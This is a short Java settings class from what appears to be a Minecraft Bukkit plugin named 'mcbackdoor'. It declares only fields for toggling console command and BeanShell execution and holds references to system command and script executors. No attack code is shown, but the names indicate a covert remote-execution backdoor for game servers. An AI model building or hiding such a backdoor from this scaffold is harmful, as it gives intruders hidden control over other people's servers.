/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */

package org.martin.bukkit.mcbackdoor.scmd;

import java.io.PrintStream;
import org.martin.bukkit.mcbackdoor.utils.AsyncCommandSender;
import org.martin.bukkit.mcbackdoor.utils.BSHExecutor;
import org.martin.bukkit.mcbackdoor.utils.SysCommandExecutor;

/**
 *
 * @author martin
 */
public class Settings {
    public boolean consoleCMD = false;
    public boolean consoleBSH = false;
    public SysCommandExecutor executor = null;
    public PrintStream out = null;
    public AsyncCommandSender sender;
    public BSHExecutor bshExecutor;
}
